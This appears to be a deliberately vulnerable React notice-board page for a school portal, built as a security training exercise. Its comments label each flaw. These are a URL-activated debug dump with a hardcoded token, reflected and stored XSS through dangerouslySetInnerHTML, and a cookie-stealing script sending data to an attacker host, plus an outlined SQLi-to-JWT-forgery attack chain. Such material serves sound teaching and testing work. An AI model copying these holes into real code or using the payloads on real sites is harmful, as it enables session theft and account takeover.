"use client";

// TODO: remove debug mode before prod — rverma 12/04
// DEBUG_KEY = "showAll=true" — append to URL to see hidden notices
// Internal API dump: /api/notices?debug=1&token=campuscare_debug_2025

import { useEffect, useState } from "react";
import Navbar from "@/components/Navbar";

interface Notice {
  id: number;
  title: string;
  content: string;
  author: string;
  created_at: string;
}

export default function NoticesPage() {
  const [notices, setNotices]       = useState<Notice[]>([]);
  const [filter, setFilter]         = useState("");
  const [loading, setLoading]       = useState(true);
  const [expandedId, setExpandedId] = useState<number | null>(null);
  // VULNERABILITY: debug flag read directly from URL — ?debug=true exposes raw API dump
  const [debugMode, setDebugMode]   = useState(false);
  const [rawApiDump, setRawApiDump] = useState<any>(null);

  useEffect(() => {
    // VULNERABILITY: client-side URL param enables debug features
    // visiting /notices?debug=true or /notices?showAll=true activates it
    const params = new URLSearchParams(window.location.search);
    const isDebug = params.get("debug") === "true" || params.get("showAll") === "true";
    setDebugMode(isDebug);

    fetch("/api/notices")
      .then(r => r.json())
      .then(d => {
        setNotices(d.notices || []);
        // VULNERABILITY: entire raw API response stored and rendered in debug mode
        // exposes internal object structure, field names, and notice count
        setRawApiDump(d);
        setLoading(false);
      });
  }, []);

  // VULNERABILITY: highlight function injects filter string raw into innerHTML
  // search input is not HTML-encoded before being inserted into the DOM
  // payload: <img src=x onerror="alert(document.cookie)"> fires on every notice render
  const highlightMatch = (text: string, query: string): string => {
    if (!query.trim()) return text;
    // intentionally NOT escaping query before building regex or injecting into HTML
    const escaped = query.replace(/[.*+?^${}()|[\]\\]/g, "");
    return text.replace(
      new RegExp(`(${escaped})`, "gi"),
      `<mark style="background:rgba(245,130,10,0.25);color:#c2410c;border-radius:2px;padding:0 2px">$1</mark>`
    );
  };

  const filtered = notices.filter(n =>
    !filter ||
    [n.title, n.content, n.author].some(field =>
      field.toLowerCase().includes(filter.toLowerCase())
    )
  );

  return (
    <div style={{ background:"var(--cc-bg)", minHeight:"100vh" }}>
      <Navbar />
      <div style={{ marginLeft:240, paddingTop:56 }}>
        <main style={{ padding:"28px 28px", maxWidth:900 }}>

          {/* Header */}
          <div style={{ background:"#fff", borderRadius:12, padding:"18px 24px", marginBottom:20, border:"1px solid var(--cc-border)", boxShadow:"0 2px 8px rgba(0,0,0,0.04)", display:"flex", alignItems:"center", justifyContent:"space-between" }}>
            <div>
              <h1 style={{ fontSize:20, fontWeight:900, color:"var(--cc-navy)", margin:"0 0 3px" }}>Notice Board</h1>
              <p style={{ fontSize:12, color:"var(--cc-text-muted)", margin:0 }}>Greenfield International · Official Bulletin</p>
            </div>
            <div style={{ display:"flex", alignItems:"center", gap:6, background:"rgba(22,163,74,0.08)", border:"1px solid rgba(22,163,74,0.2)", padding:"4px 12px", borderRadius:20 }}>
              <span style={{ position:"relative", display:"inline-flex", width:8, height:8 }}>
                <span style={{ position:"absolute", inset:0, borderRadius:"50%", background:"#16a34a", animation:"ping 1s cubic-bezier(0,0,0.2,1) infinite", opacity:0.75 }}/>
                <span style={{ position:"relative", width:8, height:8, borderRadius:"50%", background:"#16a34a", display:"inline-block" }}/>
              </span>
              <span style={{ fontSize:10, fontWeight:800, color:"#16a34a", textTransform:"uppercase", letterSpacing:1.5 }}>Live</span>
            </div>
          </div>

          {/* VULNERABILITY: Debug panel — activated via ?debug=true in the URL
              Dumps the raw API response object to screen including:
              - all field names returned by the API
              - total notice count
              - link to the admin notices endpoint
              Attack: visit /notices?debug=true to see the full API response structure */}
          {debugMode && rawApiDump && (
            <div style={{
              background:"#0a1a0a", border:"1px solid rgba(34,197,94,0.3)",
              borderRadius:8, padding:16, marginBottom:20, fontFamily:"'DM Mono',monospace",
            }}>
              <div style={{ fontSize:11, color:"#4ade80", marginBottom:8, textTransform:"uppercase", letterSpacing:1 }}>
                ⚠ Debug Mode Active — Raw API Response
              </div>
              <pre style={{ fontSize:11, color:"#86efac", overflowX:"auto", whiteSpace:"pre-wrap", wordBreak:"break-all" }}>
                {JSON.stringify(rawApiDump, null, 2)}
              </pre>
              <div style={{ fontSize:10, color:"#4ade80", marginTop:10, opacity:0.7 }}>
                {/* VULNERABILITY: directly reveals admin endpoint in debug output */}
                Admin view available at:{" "}
                <a href="/api/admin/notices" style={{ color:"#4ade80", textDecoration:"underline" }}>
                  /api/admin/notices
                </a>{" "}
                (requires role: admin in JWT)
              </div>
            </div>
          )}

          {/* Search Bar */}
          <div style={{ marginBottom:8, position:"relative" }}>
            <span style={{ position:"absolute", left:14, top:"50%", transform:"translateY(-50%)", fontSize:16, color:"var(--cc-text-muted)", pointerEvents:"none" }}>🔍</span>
            <input
              type="text"
              value={filter}
              onChange={e => setFilter(e.target.value)}
              placeholder="Search bulletin keywords..."
              style={{ width:"100%", border:"1.5px solid var(--cc-border)", borderRadius:10, padding:"11px 40px 11px 40px", fontSize:13, fontFamily:"'DM Mono',monospace", outline:"none", background:"#fff", boxSizing:"border-box", transition:"border-color 0.2s", color:"var(--cc-text)" }}
              onFocus={e=>(e.target.style.borderColor="var(--cc-orange)")}
              onBlur={e=>(e.target.style.borderColor="var(--cc-border)")}
            />
            {filter && (
              <button onClick={() => setFilter("")} style={{ position:"absolute", right:14, top:"50%", transform:"translateY(-50%)", background:"none", border:"none", fontSize:18, color:"var(--cc-text-muted)", cursor:"pointer" }}>×</button>
            )}
          </div>

          {/* VULNERABILITY: Reflected XSS — filter value injected raw into DOM via dangerouslySetInnerHTML
              Renders ALWAYS even when no notices match — XSS fires immediately on any input.
              Attack: type  <img src=x onerror=alert(document.cookie)>  in the search box */}
          {filter && (
            <div style={{ marginBottom:14, paddingLeft:4 }}>
              <p
                className="font-mono"
                style={{ fontSize:11, color:"var(--cc-text-muted)", margin:0 }}
                dangerouslySetInnerHTML={{
                  __html: `Searching bulletins for: <span style="color:var(--cc-orange);font-weight:700">${filter}</span>`
                }}
              />
            </div>
          )}

          {/* Notice Feed */}
          <div style={{ display:"flex", flexDirection:"column", gap:10 }}>
            {loading ? (
              [1,2,3,4].map(i => <div key={i} style={{ height:72, background:"#fff", borderRadius:10, border:"1px solid var(--cc-border)", opacity:0.5, animation:"pulse 1.5s ease-in-out infinite" }}/>)
            ) : filtered.length === 0 ? (
              <div style={{ textAlign:"center", padding:"60px 0", background:"#fff", borderRadius:12, border:"2px dashed var(--cc-border)" }}>
                <div style={{ fontSize:36, marginBottom:10, opacity:0.4 }}>📑</div>
                <p style={{ color:"var(--cc-text-muted)", fontSize:13, margin:0 }}>No bulletins match your current filter.</p>
                {filter && <button onClick={()=>setFilter("")} style={{ marginTop:12, fontSize:12, color:"var(--cc-orange)", background:"none", border:"none", cursor:"pointer", textDecoration:"underline" }}>Clear Filter</button>}
              </div>
            ) : (
              filtered.map(n => (
                <NoticeCard
                  key={n.id}
                  notice={n}
                  isExpanded={expandedId === n.id}
                  onToggle={() => setExpandedId(expandedId === n.id ? null : n.id)}
                  highlight={filter}
                  highlightFn={highlightMatch}
                />
              ))
            )}
          </div>

          {/* Footer */}
          {!loading && (
            <footer style={{ marginTop:28, paddingTop:16, borderTop:"1px solid var(--cc-border)", display:"flex", justifyContent:"space-between", alignItems:"center", fontSize:10, fontFamily:"'DM Mono',monospace", color:"var(--cc-text-muted)", textTransform:"uppercase", letterSpacing:1 }}>
              <span>{filtered.length} Notices</span>
              <span>Updated: {new Date().toLocaleTimeString("en-IN")}</span>
              {/* VULNERABILITY: [sys] link visible in page source — hints at debug mode
                  colour matches background so visually hidden but present in DOM */}
              {!debugMode && (
                <a href="?debug=true" style={{ color:"#f5f7fa", fontSize:10, textDecoration:"none" }} title="sys">[sys]</a>
              )}
            </footer>
          )}
        </main>
      </div>
    </div>
  );
}

// ── Sub-components ──────────────────────────────────────────────────────────

function NoticeCard({
  notice, isExpanded, onToggle, highlight, highlightFn,
}: {
  notice: Notice;
  isExpanded: boolean;
  onToggle: () => void;
  highlight: string;
  highlightFn: (text: string, query: string) => string;
}) {
  const isNew = (Date.now() - new Date(notice.created_at).getTime()) < 86400000 * 3;

  const getAccent = (author: string) => {
    if (author === "admin")     return "#dc2626";
    if (author === "principal") return "#d97706";
    return "#1a3c6e";
  };

  const accent = getAccent(notice.author);

  return (
    <div style={{
      background:"#fff", border:"1px solid var(--cc-border)", borderLeft:`4px solid ${accent}`,
      borderRadius:10, overflow:"hidden", transition:"box-shadow 0.2s",
      boxShadow: isExpanded ? "0 4px 16px rgba(0,0,0,0.08)" : "0 1px 4px rgba(0,0,0,0.04)",
    }}>
      <button onClick={onToggle} style={{ width:"100%", textAlign:"left", padding:"14px 18px", background:"none", border:"none", cursor:"pointer", display:"flex", alignItems:"center", gap:14 }}>
        <div style={{ flex:1, minWidth:0 }}>
          <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:4, flexWrap:"wrap" }}>
            {/* VULNERABILITY: Reflected XSS via dangerouslySetInnerHTML
                The highlight function injects the raw search input into the DOM as HTML
                Attack: type this in the search box:
                <img src=x onerror=alert(document.cookie)>
                The onerror fires on every matching notice title render */}
            <h3
              style={{ fontSize:14, fontWeight:800, color:"var(--cc-navy)", margin:0, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}
              dangerouslySetInnerHTML={{ __html: highlightFn(notice.title, highlight) }}
            />
            {isNew && (
              <span style={{ fontSize:9, fontWeight:800, background:"rgba(22,163,74,0.1)", color:"#16a34a", border:"1px solid rgba(22,163,74,0.2)", padding:"1px 6px", borderRadius:20, textTransform:"uppercase", flexShrink:0 }}>New</span>
            )}
          </div>
          <div style={{ display:"flex", alignItems:"center", gap:8 }}>
            {/* VULNERABILITY: Stored XSS surface — author field rendered as raw HTML
                If an attacker can control the author field (e.g. via forged admin JWT
                posting a notice), any HTML in the author name executes here
                Attack: POST /api/admin/notices with author containing <script>...</script> */}
            <span
              style={{ fontSize:11, fontWeight:700, background: accent+"18", color:accent, border:`1px solid ${accent}30`, padding:"1px 8px", borderRadius:20 }}
              dangerouslySetInnerHTML={{ __html: notice.author }}
            />
            <span style={{ fontSize:11, color:"var(--cc-text-muted)" }}>{new Date(notice.created_at).toLocaleDateString("en-IN")}</span>
          </div>
        </div>
        <span style={{ color:"var(--cc-text-muted)", fontSize:12, transform: isExpanded?"rotate(180deg)":"none", transition:"transform 0.3s", flexShrink:0 }}>▼</span>
      </button>

      {isExpanded && (
        <div style={{ padding:"0 18px 16px 18px", borderTop:"1px solid var(--cc-border)" }}>
          <div style={{ paddingTop:14 }}>
            {/* VULNERABILITY: Stored XSS — notice content rendered as raw HTML
                An admin (or attacker with forged admin JWT) can POST a notice with:
                content: "<script>document.location='https://attacker.com?c='+document.cookie</script>"
                This executes for every user who expands that notice
                Combined attack: SQLi login → JWT forge → POST malicious notice → steal all session cookies */}
            <p
              style={{ fontSize:13, color:"var(--cc-text)", lineHeight:1.7, margin:0 }}
              dangerouslySetInnerHTML={{ __html: highlightFn(notice.content, highlight) }}
            />
          </div>
        </div>
      )}
    </div>
  );
}